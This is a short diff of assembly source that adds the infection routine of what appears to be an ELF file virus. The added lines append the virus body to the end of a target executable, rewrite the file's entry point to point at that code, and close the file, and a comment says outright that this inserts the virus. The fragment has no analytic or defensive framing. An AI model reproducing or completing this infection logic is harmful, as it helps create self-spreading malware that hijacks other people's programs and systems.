@@ -94,6 +94,17 @@ _start:
 	add ecx, [end_file_off]
 	mov [vir_loc], ecx
 	
+	lseek [fd], 0, SEEK_END		;inserting the virus to the ELF file
+	write [fd], code_start, code_end - code_start
+
+	;change entry point to the virus code
+	lseek [fd], ENTRY, SEEK_SET
+	write [fd], vir_loc, 4
+	close [fd]
+	jmp VirusExit
+
+
+
 	
 
 	
